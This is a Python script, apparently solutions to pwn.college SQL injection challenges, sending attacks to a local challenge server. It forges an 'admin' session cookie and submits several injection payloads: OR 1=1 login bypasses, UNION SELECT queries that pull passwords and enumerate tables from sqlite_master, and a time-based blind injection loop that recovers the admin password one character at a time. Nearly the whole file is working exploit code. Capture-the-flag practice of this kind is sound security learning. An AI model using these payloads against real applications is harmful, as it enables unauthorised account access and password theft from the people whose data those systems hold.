import requests

TARGET = "http://challenge.localhost:80"

def autBypass2():
    cookies = {
        "session_user" : "admin"
    }
    res = requests.get(TARGET, cookies=cookies)
    print(res.content)

def sqli1():
    data = {
        "user-handle" : "admin",
        "pin" : "012 OR 1=1--",
    }
    route = TARGET + "/authentication"
    res = requests.post(route, data=data)
    print(res.text)
    return

def sqli2():
    data = {
        "username" : "admin",
        "user-secret" : "012' OR 1=1--",
    }
    route = TARGET + "/login-session"
    res = requests.post(route, data=data)
    print(res.text)
    return

def sqli3():
    data = {
        "query" : "no\" UNION SELECT password FROM users WHERE username LIKE \"%\"--",
    }
    route = TARGET
    res = requests.get(route, params=data)
    print(res.text)
    return

def sqli4():
    # data = {
    #     "query" : f"no\" UNION SELECT name FROM sqlite_master WHERE type='table' --",
    # }
    data = {
        "query" : "no\" UNION SELECT password FROM users_5165866558 WHERE username=\"admin\"--",
    }
    route = TARGET
    res = requests.get(route, params=data)
    print(res.text)
    return

#60
def sqli5():
    #CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
    myList = [chr(i) for i in range(ord('a'), ord('z') +1)] + ['0','1','2','3', '4', '5', '6', '7', '8', '9', '_', '.'] + [chr(i) for i in range(ord('A'), ord('Z') +1)]
    # for i in range(13,60):
    for i in range(33,60):
        for char in myList:
            print(f"[{char}]")
            data = {
            "username" : "admin",
            # "password" : "' OR 1=randomblob(1000000000) --",
            "password" : f"' OR CASE WHEN SUBSTR((SELECT password FROM users WHERE username=\"admin\"),{i},1)='{char}' THEN 1=randomblob(1000000000) ELSE 1 END--",
            }
            route = TARGET
            res = requests.post(route, data=data)
    return

def main():
    sqli5()
    return (0)

if __name__ == "__main__":
    main()

"""
List of pwn college sqli exploit
"""